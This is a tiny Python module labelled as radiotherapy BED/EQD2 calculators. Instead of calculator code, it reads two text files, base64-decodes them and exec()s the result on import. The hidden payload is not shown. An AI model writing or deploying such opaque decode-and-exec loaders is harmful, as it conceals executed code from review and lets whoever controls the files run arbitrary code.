"""BED / EQD2 / gap / fractionation calculators."""
import base64
from pathlib import Path as _P
_b64 = (_P(__file__).parent / "bed_b0.txt").read_text() + (_P(__file__).parent / "bed_b1.txt").read_text()
_CODE = base64.b64decode(_b64).decode("utf-8")
exec(compile(_CODE, str(_P(__file__).resolve()), "exec"), globals())
